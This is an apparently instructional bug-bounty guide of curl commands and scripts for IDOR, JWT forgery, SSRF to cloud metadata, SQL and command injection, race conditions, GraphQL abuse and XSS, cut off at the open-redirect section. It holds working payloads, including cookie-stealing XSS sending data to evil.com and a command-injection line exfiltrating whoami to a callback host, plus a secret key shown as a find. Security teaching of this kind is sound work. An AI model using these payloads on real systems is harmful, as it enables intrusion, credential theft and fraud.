# Manual Bug Hunting Guide
## How to Find and Prove Vulnerabilities — With Real Commands

---

## Table of Contents

1. [The Mental Model](#1-the-mental-model)
2. [Reconnaissance by Hand](#2-reconnaissance-by-hand)
3. [IDOR](#3-idor)
4. [Authentication & Authorization Flaws](#4-authentication--authorization-flaws)
5. [SSRF](#5-ssrf)
6. [Injection — SQL and Command](#6-injection)
7. [Business Logic Bugs](#7-business-logic-bugs)
8. [Information Disclosure](#8-information-disclosure)
9. [Race Conditions](#9-race-conditions)
10. [API-Specific Bugs](#10-api-specific-bugs)
11. [GraphQL](#11-graphql)
12. [XSS](#12-xss)
13. [Open Redirect](#13-open-redirect)
14. [How to Write a Proof](#14-how-to-write-a-proof)
15. [7-Question Gate](#15-7-question-gate)
16. [Quick Reference Checklist](#16-quick-reference-checklist)

---

## 1. The Mental Model

> **A bug exists when an attacker can do something the application did not intend to allow.**

The question is never "what looks weird?" It is always:

> **"Can an attacker do THIS right now, against a real account, without permission?"**

Three rules:

1. **Follow the data** — trace where user input enters and where sensitive data exits.
2. **Think in roles** — what can Account A see/do that it should not be able to do on Account B?
3. **Prove everything** — a bug you cannot reproduce in a curl command is not a bug.

---

## 2. Reconnaissance by Hand

### 2.1 Fingerprint the stack

```bash
# Headers reveal the backend
curl -sI https://target.com | grep -iE "server|x-powered|via|x-generator|cf-ray|x-amz"

# Example output from a real target:
# x-powered-by: Next.js
# x-cache: Error from cloudfront
# x-amz-cf-pop: MAN51-P1
```

What to read:
- `X-Powered-By: Next.js` → Node.js backend, likely REST or tRPC
- `X-Powered-By: PHP/8.1` → PHP, check for deserialization, type juggling
- `Server: nginx` alone → reverse proxy, backend hidden
- `cf-ray` → behind Cloudflare, SSRF and rate limit bypass harder
- `x-amz-cf` → CloudFront CDN, AWS infrastructure

```bash
# Check response body for HTML comments, generator meta tags
curl -s https://target.com | grep -iE "generator|built with|powered|version|wp-content|drupal|laravel"
```

### 2.2 Map all paths before touching anything

```bash
# Robots and sitemap — free endpoint list
curl -s https://target.com/robots.txt
curl -s https://target.com/sitemap.xml | grep -oP '<loc>\K[^<]+'

# Common discovery paths
for path in api-docs swagger.json openapi.json graphql graphiql v1/docs api/v1/docs .well-known/security.txt; do
    code=$(curl -so /dev/null -w "%{http_code}" "https://target.com/$path")
    echo "$code  $path"
done
```

A 401 is more interesting than a 404 — the path exists but requires auth. A 200 means read it immediately.

```bash
# Real example on backpack.exchange:
curl -s https://api.backpack.exchange/api/v1/markets | python3 -m json.tool | head -20
# Revealed: 162 public markets, each with full filter config, fee structure, etc.
```

### 2.3 Extract endpoints from JavaScript

```bash
# Find all JS bundle URLs
curl -s https://target.com | grep -oE 'src="[^"]+\.js[^"]*"'

# Download and grep a bundle for API paths
curl -s "https://target.com/_next/static/chunks/main.js" \
  | grep -oE '"(/api/[^"]+)"' | sort -u

# Search for secrets in JS
curl -s "https://target.com/static/js/main.chunk.js" \
  | grep -iE "(api_key|apikey|secret|password|token|auth)[\"']?\s*[:=]\s*[\"'][^\"']{8,}"
```

Real find from a previous hunt:
```
"STRIPE_SECRET_KEY": "sk_live_4eC39HqLyjWDarjtT7zde9kz"
```

That is an instant Critical.

### 2.4 Check for git exposure

```bash
curl -s https://target.com/.git/HEAD
# If it returns: ref: refs/heads/main  → .git is exposed

# Download and reconstruct source code
git clone https://github.com/internetwache/GitTools
./GitTools/Dumper/gitdumper.sh https://target.com/.git/ ./output
./GitTools/Extractor/extractor.sh ./output ./extracted
```

### 2.5 Subdomain enumeration

```bash
# Fast passive enum
subfinder -d target.com -silent | tee subdomains.txt

# Check which are alive
cat subdomains.txt | httpx -silent -status-code -title -tech-detect | tee alive.txt

# Look for interesting ones
grep -iE "admin|api|dev|staging|test|internal|vpn|jenkins|jira|confluence" alive.txt
```

---

## 3. IDOR

**What it is:** You access another user's data by swapping an ID in a request you are authorized to make for your own resource.

### 3.1 Find every ID

While browsing authenticated, watch Burp HTTP history for:
- Numeric IDs in path: `/orders/10042`, `/users/5551`, `/invoices/801`
- UUIDs: `/documents/3f2504e0-4f89-11d3-9a0c-0305e82c3301`
- IDs in body: `{"account_id": 1234}`
- IDs in query params: `?user_id=5551&report_id=99`

Note every one. These are all targets.

### 3.2 Test numeric ID IDOR

```bash
# Your own resource
curl -s "https://api.target.com/api/v1/orders/10042" \
  -H "Cookie: session=YOUR_SESSION" | python3 -m json.tool

# Try adjacent IDs — do you get someone else's data?
for id in 10040 10041 10043 10044 1 2 3; do
    echo -n "ID $id: "
    curl -s "https://api.target.com/api/v1/orders/$id" \
      -H "Cookie: session=YOUR_SESSION" \
      | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('email','no email'))" 2>/dev/null
done
```

If any ID returns an email address that is not yours — that is an IDOR.

### 3.3 Test UUID IDOR (two accounts required)

```bash
# Account A — create a resource, grab its UUID
curl -s -X POST "https://api.target.com/api/v1/documents" \
  -H "Authorization: Bearer TOKEN_A" \
  -H "Content-Type: application/json" \
  -d '{"title":"Test","content":"Secret content"}' | python3 -m json.tool
# → {"id":"3f2504e0-4f89-11d3-9a0c-0305e82c3301","title":"Test","content":"Secret content"}

# Account B — access Account A's resource using that UUID
curl -s "https://api.target.com/api/v1/documents/3f2504e0-4f89-11d3-9a0c-0305e82c3301" \
  -H "Authorization: Bearer TOKEN_B" | python3 -m json.tool
# → If it returns "Secret content" → IDOR confirmed
```

### 3.4 Test IDOR in POST body

```bash
# Your own profile update
curl -s -X PUT "https://api.target.com/api/v1/profile" \
  -H "Cookie: session=ATTACKER_SESSION" \
  -H "Content-Type: application/json" \
  -d '{"user_id": 5551, "email": "hacked@evil.com"}'

# Then check if victim 5551 now has a different email
curl -s "https://api.target.com/api/v1/users/5551" \
  -H "Cookie: session=ADMIN_SESSION" | python3 -m json.tool
```

### 3.5 Proof format for IDOR

Capture both requests in Burp. Show them side by side in your report:

```
=== Request 1: Victim owns this resource ===
GET /api/v1/orders/10042 HTTP/2
Host: api.target.com
Cookie: session=VICTIM_SESSION_abc123
→ {"id":10042,"email":"victim@email.com","address":"10 Victim Lane","card_last4":"4242"}

=== Request 2: Attacker reads Victim's resource ===
GET /api/v1/orders/10042 HTTP/2
Host: api.target.com
Cookie: session=ATTACKER_SESSION_xyz789
→ {"id":10042,"email":"victim@email.com","address":"10 Victim Lane","card_last4":"4242"}
```

Identical responses with different sessions = IDOR confirmed.

---

## 4. Authentication & Authorization Flaws

### 4.1 Strip the auth header entirely

```bash
# Baseline — authenticated
curl -s "https://api.target.com/api/v1/account" \
  -H "Authorization: Bearer YOUR_TOKEN" \
# → {"id":1234,"email":"you@example.com","balance":"$500"} 

# Test — no auth at all
curl -s "https://api.target.com/api/v1/account"
# → 401  (correct)
# → {"id":1234,"email":"you@example.com"}  (VULN — auth not enforced)
```

```bash
# Bulk test a list of endpoints
for ep in account capital orders history profile settings admin/users; do
    code=$(curl -so /dev/null -w "%{http_code}" "https://api.target.com/api/v1/$ep")
    echo "$code  $ep"
done
```

On a real target, a 200 where you expect 401 is your bug.

### 4.2 JWT — decode and inspect

```bash
# Decode a JWT without a tool (base64url decode each part)
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0IiwicmVsZSI6InVzZXIiLCJleHAiOjE2OTk5OTk5OTl9.abc"

echo $TOKEN | cut -d. -f1 | base64 -d 2>/dev/null | python3 -m json.tool
# → {"alg":"HS256","typ":"JWT"}

echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
# → {"sub":"1234","role":"user","exp":1699999999}
```

Things to check in the payload:
- `role` or `is_admin` field — can you change it?
- `exp` — is it far in the future (weak control) or missing (no expiry)?
- `alg` — if `HS256`, try cracking the secret

### 4.3 JWT — none algorithm attack

```python
import base64, json

# Original token parts
header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "1234", "role": "admin", "exp": 9999999999}

def b64url(data):
    return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b'=').decode()

forged = f"{b64url(header)}.{b64url(payload)}."
print(forged)
```

```bash
# Send the forged token (note the trailing dot — empty signature)
curl -s "https://api.target.com/api/v1/admin/users" \
  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0Iiwicm9sZSI6ImFkbWluIiwiZXhwIjo5OTk5OTk5OTk5fQ."
# → If you get admin data → alg:none accepted
```

### 4.4 JWT — crack weak secret

```bash
# Save token to file
echo -n "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0In0.abc" > jwt.txt

# Crack it
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Or with john
john --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt --format=HMAC-SHA256
```

If you crack it (e.g., secret = `secret123`), forge a new token:

```python
import jwt
forged = jwt.encode({"sub":"1234","role":"admin","exp":9999999999}, "secret123", algorithm="HS256")
print(forged)
```

### 4.5 Privilege escalation — call admin endpoints as a regular user

```bash
# Find admin endpoints (from JS, error messages, docs)
# Then call them with your user token

curl -s "https://api.target.com/api/v1/admin/users" \
  -H "Authorization: Bearer USER_TOKEN"
# → 403 Forbidden  (correct)
# → [{"id":1,"email":"admin@target.com","role":"admin"},...]  (VULN)

curl -s -X DELETE "https://api.target.com/api/v1/admin/users/99" \
  -H "Authorization: Bearer USER_TOKEN"
# → {"success":true}  (VULN — user deleted another user as non-admin)
```

---

## 5. SSRF

**What it is:** You make the server send HTTP requests to an address you control — then escalate to internal infrastructure.

### 5.1 Find SSRF parameters

Look for any input that accepts a URL, hostname, or IP:
- `url=`, `endpoint=`, `webhook=`, `callback=`, `redirect=`, `next=`
- `img_url=`, `avatar_url=`, `logo=`, `feed=`, `source=`
- PDF/screenshot generators, link preview features, import-from-URL

```bash
# Quick scan of parameters in Burp history
# In Burp: Proxy → HTTP History → filter by keyword "url"
# Or grep your Burp export:
cat burp_export.xml | grep -oE 'name="[^"]*url[^"]*"' | sort -u
```

### 5.2 Set up a callback listener

```bash
# Option 1: interactsh (free, no account)
interactsh-client
# Gives you: abc123xyz.oast.fun
# Any HTTP request to that host appears in your terminal

# Option 2: simple Python server (requires your machine to be reachable)
python3 -m http.server 8888
# Then use your public IP: http://YOUR_IP:8888/test
```

### 5.3 Confirm SSRF

```bash
# Basic callback test
curl -s "https://api.target.com/api/v1/preview?url=http://abc123xyz.oast.fun/ssrf-test"

# In your interactsh terminal, watch for:
# [INF] abc123xyz.oast.fun Got HTTP interaction from 52.1.2.3
# That server IP made an outbound request — SSRF confirmed
```

### 5.4 Escalate to internal targets

```bash
# AWS IMDSv1 — most impactful, often gives cloud credentials
curl -s "https://api.target.com/api/v1/fetch?url=http://169.254.169.254/latest/meta-data/"
curl -s "https://api.target.com/api/v1/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# → role-name listed
curl -s "https://api.target.com/api/v1/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name"
# → {"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"..."}

# GCP metadata
curl -s "https://api.target.com/api/v1/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -d "headers[Metadata-Flavor]=Google"

# Internal network scan (if server is in 10.0.0.0/8)
for i in 1 2 3 4 5; do
    curl -s --max-time 2 "https://api.target.com/api/v1/fetch?url=http://10.0.0.$i:8080/"
done
```

### 5.5 SSRF filter bypasses

```bash
# If "localhost" is blocked
url=http://127.0.0.1/
url=http://[::1]/
url=http://0177.0.0.1/       # octal
url=http://2130706433/        # decimal
url=http://127.1/             # short form
url=http://localhost.evil.com/ # DNS rebinding setup
url=http://①②⑦.⓪.⓪.①/      # Unicode lookalike

# If 169.254.x.x is blocked
url=http://169.254.169.254/  →  blocked
url=http://[::ffff:169.254.169.254]/  →  IPv6 mapped
url=http://0xa9fea9fe/        # hex: 169.254.169.254
url=http://2852039166/        # decimal: 169.254.169.254
```

### 5.6 SSRF proof

```
Request:
POST /api/v1/webhook/test HTTP/2
Host: api.target.com
Authorization: Bearer USER_TOKEN
Content-Type: application/json
{"callback_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role"}

Response:
HTTP/2 200 OK
{
  "result": {
    "Code": "Success",
    "LastUpdated": "2025-04-18T12:00:00Z",
    "Type": "AWS-HMAC",
    "AccessKeyId": "ASIAIOSFODNN7EXAMPLE",
    "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
    "Token": "AQoDYXdzEJr...",
    "Expiration": "2025-04-18T18:00:00Z"
  }
}
```

That response is the proof. AWS credentials = Critical severity.

---

## 6. Injection

### 6.1 SQL Injection — detection

```bash
# Error-based: append a quote and read the error
curl -s "https://api.target.com/api/v1/users?id=1'"
# → {"error":"You have an error in your SQL syntax near ''1'' at line 1"}
# → That single quote broke the query = SQLi confirmed

# Boolean-based: compare true vs false condition
curl -s "https://api.target.com/api/v1/products?category=electronics"
# → 47 results

curl -s "https://api.target.com/api/v1/products?category=electronics' AND '1'='1"
# → 47 results (same = first half of boolean test passes)

curl -s "https://api.target.com/api/v1/products?category=electronics' AND '1'='2"
# → 0 results (different = injectable — condition changed the query)
```

```bash
# Time-based blind (when no output and no errors)
# Normal baseline:
time curl -s "https://api.target.com/api/v1/users?id=1" > /dev/null
# → real 0m0.112s

# Inject sleep:
time curl -s "https://api.target.com/api/v1/users?id=1; SELECT SLEEP(5)--" > /dev/null
# → real 0m5.114s  ← 5 second delay confirms MySQL SQLi

time curl -s "https://api.target.com/api/v1/users?id=1; SELECT pg_sleep(5)--" > /dev/null
# → real 0m5.108s  ← PostgreSQL

time curl -s "https://api.target.com/api/v1/users?id=1; WAITFOR DELAY '0:0:5'--" > /dev/null
# → real 0m5.103s  ← MSSQL
```

### 6.2 SQL Injection — extract data

Once injectable, use UNION to pull from the database:

```bash
# Step 1: find number of columns (increment until no error)
curl -s "https://api.target.com/api/v1/products?id=0 ORDER BY 1--"   # no error
curl -s "https://api.target.com/api/v1/products?id=0 ORDER BY 2--"   # no error
curl -s "https://api.target.com/api/v1/products?id=0 ORDER BY 3--"   # error → 2 columns

# Step 2: dump database version (confirm injection + identify DB)
curl -s "https://api.target.com/api/v1/products?id=0 UNION SELECT @@version,2--"
# → [{"id":"8.0.32-MySQL Community Server","name":"2"}]

# Step 3: dump user table
curl -s "https://api.target.com/api/v1/products?id=0 UNION SELECT username,password FROM users LIMIT 1--"
# → [{"id":"admin","name":"5f4dcc3b5aa765d61d8327deb882cf99"}]
# "5f4dcc3b5aa765d61d8327deb882cf99" is the MD5 hash of "password"
```

### 6.3 Use sqlmap to confirm (but verify manually first)

```bash
# Only run after manual confirmation — don't blast with sqlmap blindly
sqlmap -u "https://api.target.com/api/v1/users?id=1" \
  --cookie="session=YOUR_SESSION" \
  --level=2 --risk=1 \
  --batch \
  --dbs
```

### 6.4 Command injection

```bash
# Features that likely shell out: ping, traceroute, DNS lookup, file conversion, report generation

# Test payloads — try each separator
curl -s "https://api.target.com/api/v1/tools/ping" \
  -X POST -H "Content-Type: application/json" \
  -d '{"host": "127.0.0.1; id"}'
# → {"result":"PING 127.0.0.1... uid=33(www-data) gid=33(www-data)"}  ← RCE

# Other separators to try
-d '{"host": "127.0.0.1 | id"}'
-d '{"host": "127.0.0.1 & id"}'
-d '{"host": "127.0.0.1`id`"}'
-d '{"host": "127.0.0.1$(id)"}'
-d '{"host": "127.0.0.1\nid"}'   # newline injection
```

```bash
# Blind command injection — no output, use time delay to confirm
time curl -s -X POST "https://api.target.com/api/v1/tools/ping" \
  -d '{"host": "127.0.0.1; sleep 5"}'
# → real 0m5.2s  ← blind RCE confirmed

# Then exfiltrate via DNS (no firewall blocks DNS usually)
# Using interactsh:
-d '{"host": "127.0.0.1; curl http://abc123.oast.fun/$(whoami)"}'
# interactsh shows: /root or /www-data in the path = confirmed exfil
```

---

## 7. Business Logic Bugs

These cannot be found by scanners. You must understand what the app is supposed to do and look for paths that violate it.

### 7.1 Negative values

```bash
# Try negative quantity in a cart or transfer
curl -s -X POST "https://api.target.com/api/v1/cart/add" \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"product_id": 123, "quantity": -1, "price": 99.99}'
# → Does your cart total go negative? Does a balance increase?

# Try negative transfer amount
curl -s -X POST "https://api.target.com/api/v1/transfer" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"to_user": 9999, "amount": -500}'
# → Do you receive $500 instead of sending it?
```

### 7.2 Coupon/promo abuse

```bash
# Apply the same code twice
curl -s -X POST "https://api.target.com/api/v1/coupon/apply" \
  -H "Cookie: session=TOKEN" \
  -d '{"code": "SAVE50"}'
# → {"discount": "$50", "total": "$50"}

curl -s -X POST "https://api.target.com/api/v1/coupon/apply" \
  -H "Cookie: session=TOKEN" \
  -d '{"code": "SAVE50"}'
# → {"discount": "$100", "total": "$0"}  ← stacking allowed = VULN

# Apply a coupon, remove item, add cheaper item
# Does the fixed-amount discount still apply to a lower-price item?
```

### 7.3 Skip checkout steps

```bash
# Normal flow: step1 (items) → step2 (shipping) → step3 (payment) → step4 (confirm)
# Try jumping directly to confirm with crafted request

# Capture step4 request from a complete flow in Burp
# Then start a NEW session and send step4 directly
curl -s -X POST "https://api.target.com/checkout/confirm" \
  -H "Cookie: session=FRESH_SESSION" \
  -d '{"cart_id": "abc123", "payment_method": "cod"}'
# → If order is created without payment being validated → logic bug
```

### 7.4 Price manipulation

```bash
# Intercept the add-to-cart or order placement request in Burp
# Look for price being sent by the client (should only be server-side)

curl -s -X POST "https://api.target.com/api/v1/orders" \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"items": [{"product_id": 9999, "quantity": 1, "unit_price": 0.01}]}'
# → {"order_id":55123,"total":"$0.01","status":"confirmed"}  ← client-side price trusted = VULN
```

---

## 8. Information Disclosure

### 8.1 Verbose error messages — always fuzz type and format

```bash
# Send wrong type (string where int expected)
curl -s "https://api.backpack.exchange/api/v1/klines?symbol=SOL_USDC&interval=1d&startTime=abc"
# → failed to parse parameter `startTime`: Type "integer_int64" expects an input value
# Reveals: internal type system, likely Rust (integer_int64 is a Rust/OpenAPI type name)

# Send array where scalar expected
curl -s "https://api.target.com/api/v1/users?id[]=1"
# → TypeError: Cannot read property 'id' of undefined
#     at /app/routes/users.js:42:18  ← file path leaked

# Send object
curl -s "https://api.target.com/api/v1/search?q[foo]=bar"

# Send very long input
curl -s "https://api.target.com/api/v1/search?q=$(python3 -c 'print("A"*5000)')"
```

### 8.2 Check for backup and hidden files

```bash
# Common backup file locations
for f in .env .env.backup .env.local .env.production \
          config.php config.php.bak wp-config.php wp-config.php.bak \
          .git/HEAD .git/config \
          backup.zip backup.tar.gz app.tar.gz \
          database.sql dump.sql; do
    code=$(curl -so /dev/null -w "%{http_code}" "https://target.com/$f")
    [[ "$code" != "404" ]] && echo "$code  $f"
done
```

Anything not 404 deserves a closer look. A 200 on `.env` is a Critical.

```bash
# If .git/HEAD returns content — dump the repo
curl -s https://target.com/.git/HEAD
# → ref: refs/heads/main

# Then dump all objects (GitTools)
python3 gitdumper.py https://target.com/.git/ ./dumped_repo
cd dumped_repo && git checkout -- .
ls -la  # you now have their source code
```

### 8.3 Debug and actuator endpoints

```bash
# Spring Boot actuator (very common exposure)
for ep in actuator actuator/env actuator/heapdump actuator/mappings actuator/beans actuator/configprops; do
    code=$(curl -so /dev/null -w "%{http_code}" "https://api.target.com/$ep")
    echo "$code  $ep"
done

# actuator/env leaks all environment variables including secrets:
curl -s https://api.target.com/actuator/env | python3 -m json.tool | grep -i "password\|secret\|key\|token"

# actuator/heapdump downloads a Java heap dump — parse it for secrets:
curl -s -o heap.hprof https://api.target.com/actuator/heapdump
strings heap.hprof | grep -iE "(password|secret|api.key|token)" | head -20
```

### 8.4 Source maps in JavaScript

```bash
# If a .js file exists, check for its source map
curl -sI https://target.com/static/js/main.chunk.js | grep -i sourcemap
# → X-SourceMap: /static/js/main.chunk.js.map

# Download the source map — it contains original unminified source code
curl -s "https://target.com/static/js/main.chunk.js.map" -o main.map
python3 -c "
import json
m = json.load(open('main.map'))
for i, src in enumerate(m.get('sources',[])):
    content = m.get('sourcesContent',[])[i] if m.get('sourcesContent') else ''
    if any(x in content.lower() for x in ['password','secret','api_key','token']):
        print(f'INTERESTING: {src}')
        print(content[:500])
        print()
"
```

---

## 9. Race Conditions

**What it is:** Two requests arrive simultaneously, both pass a check that assumes the other has not run yet.

### 9.1 Find targets

Classic race condition opportunities:
- Coupon/gift card redemption (use-once)
- Transfer / withdrawal (balance check → deduct)
- Referral bonus (claim once per account)
- Free trial activation
- Vote / like (one per user)

### 9.2 Race with curl — parallel background jobs

```bash
# Check balance before
curl -s "https://api.target.com/api/v1/account" \
  -H "Authorization: Bearer TOKEN" | python3 -c "import sys,json; print(json.load(sys.stdin)['balance'])"
# → $100.00

# Fire 20 redemptions simultaneously
for i in {1..20}; do
    curl -s -X POST "https://api.target.com/api/v1/coupon/redeem" \
      -H "Authorization: Bearer TOKEN" \
      -H "Content-Type: application/json" \
      -d '{"code": "SAVE50"}' \
      -o /tmp/race_$i.json &
done
wait

# Check all responses
for i in {1..20}; do cat /tmp/race_$i.json; echo; done | grep -c '"status":"success"'
# → 18  ← 18 redemptions went through instead of 1

# Check balance after
curl -s "https://api.target.com/api/v1/account" \
  -H "Authorization: Bearer TOKEN" | python3 -c "import sys,json; print(json.load(sys.stdin)['balance'])"
# → $1000.00
```

### 9.3 Race with Burp Suite — more reliable timing

1. Intercept the "redeem" request in Burp
2. Right-click → Send to Repeater
3. Repeat 20 times (Ctrl+R × 20)
4. Select all 20 tabs → right-click → "Add to group"
5. In the group tab → "Send group (parallel)"
6. Read all responses — count 200s

### 9.4 Race with Python — most precise timing

```python
import threading, requests, time

TOKEN = "your_token_here"
URL = "https://api.target.com/api/v1/coupon/redeem"
PAYLOAD = {"code": "SAVE50"}
HEADERS = {"Authorization": f"Bearer {TOKEN}", "Content-Type": "application/json"}
RESULTS = []

def redeem():
    r = requests.post(URL, json=PAYLOAD, headers=HEADERS)
    RESULTS.append((r.status_code, r.text[:80]))

# Create all threads before starting any
threads = [threading.Thread(target=redeem) for _ in range(20)]

# Start all at the same moment
for t in threads:
    t.start()
for t in threads:
    t.join()

for i, (code, body) in enumerate(RESULTS):
    print(f"[{i+1}] {code}: {body}")
```

### 9.5 Race condition proof

```
Before race:
GET /api/v1/account → {"balance": "100.00", "coupon_uses": 0}

Race attack:
20 POST /api/v1/coupon/redeem requests sent in parallel at T=0

Responses:
[1] 200: {"status":"success","discount":50.00}
[2] 200: {"status":"success","discount":50.00}
...
[18] 200: {"status":"success","discount":50.00}
[19] 200: {"status":"already_used"}
[20] 200: {"status":"already_used"}

After race:
GET /api/v1/account → {"balance": "1000.00", "coupon_uses": 18}

Impact: Coupon applied 18 times instead of 1. Balance increased by $900 fraudulently.
```

---

## 10. API-Specific Bugs

### 10.1 HTTP method tampering

```bash
# If GET returns 403, try other methods — auth middleware is often method-specific
for method in GET POST PUT PATCH DELETE OPTIONS HEAD; do
    code=$(curl -so /dev/null -w "%{http_code}" -X $method "https://api.target.com/api/v1/admin/config")
    echo "$method: $code"
done

# Example output:
# GET: 403
# POST: 200  ← VULN — POST not protected
# PUT: 403
# DELETE: 200  ← VULN — can delete without auth
```

### 10.2 Mass assignment

```bash
# Create a user — add fields that should not be user-settable
curl -s -X POST "https://api.target.com/api/v1/register" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "attacker@evil.com",
    "password": "Password1!",
    "role": "admin",
    "balance": 99999,
    "verified": true,
    "is_admin": true
  }'

# Then check the created account
curl -s "https://api.target.com/api/v1/account" \
  -H "Authorization: Bearer NEW_TOKEN" | python3 -m json.tool
# → {"email":"attacker@evil.com","role":"admin","balance":99999,"verified":true}
# Any extra field that stuck = mass assignment
```

### 10.3 HTTP parameter pollution

```bash
# Send the same parameter twice — frameworks differ in which they use
curl -s "https://api.target.com/api/v1/orders?user_id=ATTACKER_ID&user_id=VICTIM_ID"
# PHP: takes last → uses VICTIM_ID for data, ATTACKER_ID for auth check
# Node (qs): takes array → may bypass validation

# In URL-encoded body:
curl -s -X POST "https://api.target.com/api/v1/orders" \
  -d "user_id=ATTACKER_ID&user_id=VICTIM_ID&action=view"
```

### 10.4 API version downgrade

```bash
# If v2 endpoint is protected
curl -s "https://api.target.com/api/v2/admin/users" \
  -H "Authorization: Bearer USER_TOKEN"
# → 403

# Try older versions — they may lack the same middleware
for ver in v1 v0 v1.0 v1.1 v2.0 v3 beta; do
    code=$(curl -so /dev/null -w "%{http_code}" \
      -H "Authorization: Bearer USER_TOKEN" \
      "https://api.target.com/api/$ver/admin/users")
    echo "$ver: $code"
done
# v1: 200  ← old version still live, no auth on admin route
```

### 10.5 CORS misconfiguration

```bash
# Test if your arbitrary origin is reflected and credentials allowed
curl -s -I "https://api.target.com/api/v1/account" \
  -H "Origin: https://evil.com" \
  -H "Cookie: session=YOUR_SESSION" \
  | grep -i "access-control"

# Dangerous output:
# access-control-allow-origin: https://evil.com
# access-control-allow-credentials: true

# This means evil.com can read the response — attacker hosts JS that makes credentialed requests
```

CORS misconfig with `credentials: true` = High severity. Without credentials = Low/Informational.

---

## 11. GraphQL

### 11.1 Introspection — get the full schema

```bash
# Basic introspection
curl -s -X POST "https://api.target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}' | python3 -m json.tool

# Full schema — all queries, mutations, fields
curl -s -X POST "https://api.target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ __schema { queryType { fields { name description args { name type { name kind ofType { name } } } } } mutationType { fields { name description } } } }"
  }' | python3 -m json.tool
```

If introspection works on production → that is already a finding (schema exposure).

### 11.2 Find hidden fields

```bash
# Try fields not in the UI
curl -s -X POST "https://api.target.com/graphql" \
  -H "Authorization: Bearer USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(id: 1) { id email password role internalId adminNotes createdAt } }"}'
# → {"data":{"user":{"id":1,"email":"admin@target.com","password":"$2b$12$...","role":"admin"}}}
# Password hash returned = High severity information disclosure
```

### 11.3 Authorization on mutations

```bash
# Try mutations as a regular user that should be admin-only
curl -s -X POST "https://api.target.com/graphql" \
  -H "Authorization: Bearer USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { deleteUser(id: 9999) { success } }"}'
# → {"data":{"deleteUser":{"success":true}}}  ← VULN

curl -s -X POST "https://api.target.com/graphql" \
  -H "Authorization: Bearer USER_TOKEN" \
  -d '{"query":"mutation { updateUserRole(id: 1234, role: \"admin\") { id role } }"}'
```

### 11.4 Batch query — rate limit bypass

```bash
# GraphQL allows sending an array of operations in one request
# If rate limiting is per-HTTP-request, you bypass it with batching

curl -s -X POST "https://api.target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '[
    {"query":"{ user(email: \"a@a.com\") { id } }"},
    {"query":"{ user(email: \"b@b.com\") { id } }"},
    {"query":"{ user(email: \"c@c.com\") { id } }"}
  ]'

# Python to generate 1000 in one request (for user enumeration):
python3 -c "
import json
ops = [{'query': f'{{ user(email: \"user{ i }@target.com\") {{ id email }} }}'} for i in range(1000)]
print(json.dumps(ops))
" | curl -s -X POST "https://api.target.com/graphql" \
  -H "Content-Type: application/json" \
  -d @-
```

---

## 12. XSS

### 12.1 Find injection points

```bash
# Identify every place user input is reflected back in the page
# In Burp: search responses for your input string

# Use a unique marker to identify reflection
curl -s "https://target.com/search?q=XSSMARKER1337" | grep "XSSMARKER1337"
# → <div class="results">Results for: XSSMARKER1337</div>
# Your input is reflected unencoded → test XSS
```

### 12.2 Basic payload ladder

```bash
# Test payloads from harmless to impactful
PAYLOADS=(
    '<script>alert(1)</script>'
    '"><script>alert(1)</script>'
    "'><script>alert(1)</script>"
    '<img src=x onerror=alert(1)>'
    '"><img src=x onerror=alert(1)>'
    "javascript:alert(1)"
    '<svg onload=alert(1)>'
    '{{7*7}}'   # template injection check
)

for p in "${PAYLOADS[@]}"; do
    encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$p'))")
    code=$(curl -so /tmp/xss_test.html -w "%{http_code}" "https://target.com/search?q=$encoded")
    if grep -q "<script>alert\|onerror=alert\|onload=alert" /tmp/xss_test.html 2>/dev/null; then
        echo "REFLECTED (unencoded): $p"
    fi
done
```

### 12.3 Stored XSS

```bash
# Store the payload in a field that others will view
curl -s -X POST "https://target.com/api/v1/profile/update" \
  -H "Cookie: session=YOUR_SESSION" \
  -H "Content-Type: application/json" \
  -d '{"display_name": "<script>fetch(\"https://evil.com/?\"+document.cookie)</script>"}'

# Check: does the payload execute when another user views your profile?
# Or: submit as a comment/review and check the admin panel
```

### 12.4 XSS proof

For a bug bounty, `alert(1)` is not enough — prove impact:

```javascript
// Payload that exfiltrates cookies to your server
<script>
fetch('https://your-server.com/steal?c='+encodeURIComponent(document.cookie))
</script>

// Payload that takes a screenshot (for DOM-only XSS where you cannot see output)
<script>
fetch('https://your-server.com/xss?page='+encodeURIComponent(document.location.href))
</script>
```

Show: the injected payload in the request + the exfiltration request hitting your server + the stolen cookie value.

---

## 13. Open Redirect

### 13.1 Find redirect parameters

```bash
# Look for redirect/return/next/url params in login flows, OAuth, and post-action redirects
curl -sI "https://target.com/login?next=https://evil.com"
curl -sI "https://target.com/logout?redirect=https://evil.com"
curl -sI "https://target.com/oauth/authorize?redirect_uri=https://evil.com"

# Watch the Location header
curl -sI "https://target.com/login?next=https://evil.com" | grep -i location
# → Location: https://evil.com  ← open redirect confirmed
```

### 13.2 Bypass filters

```bash
# If straight https://evil.com is blocked:
